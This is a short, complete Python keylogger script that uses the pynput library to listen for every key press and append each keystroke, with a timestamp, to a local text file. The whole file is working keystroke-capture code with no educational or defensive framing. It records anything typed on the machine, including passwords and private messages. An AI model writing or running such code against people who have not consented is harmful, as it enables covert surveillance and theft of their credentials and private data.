from pynput import keyboard
from datetime import datetime

# Path to your text file
log_file = "key_log.txt"

print("Keylogger is running... Press Ctrl+C to stop.")

# Function to handle each key press
def on_press(key):
    try:
        # Get key as a character
        k = key.char
    except AttributeError:
        # Handle special keys (space, shift, etc.)
        k = f"[{key}]"
    
    # Add timestamp and write to file
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - {k}\n")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
